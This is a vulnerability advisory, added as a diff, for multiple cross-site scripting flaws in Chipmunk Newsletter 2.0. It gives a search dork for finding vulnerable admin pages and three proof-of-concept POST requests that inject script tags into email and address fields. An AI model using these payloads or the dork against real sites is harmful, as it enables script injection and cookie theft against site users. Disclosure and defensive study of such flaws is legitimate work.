@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/40024/info
+
+Chipmunk Newsletter is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Chipmunk Newsletter 2.0 is vulnerable; other versions may also be affected. 
+
+::[ inurl:admin/login.php "Registering Admin" ]::
+
+
+
+1 - http://localhost/sub.php
+
+POSTDATA:
+email=<script>alert(&#039;xss&#039;)</script>&choice=sub&lists=1&submit=submit
+
+
+
+2 - http://localhost/admin/addaddress.php
+
+POSTDATA:
+email=<script>alert(&#039;xss&#039;)</script>&lists=1&submit=submit
+
+
+then we can check it...
+
+
+
+http://localhost/admin/searchaddress.php
+
+POSTDATA:
+theaddress=<script>alert(&#039;xss&#039;)</script>&submit=submit
+
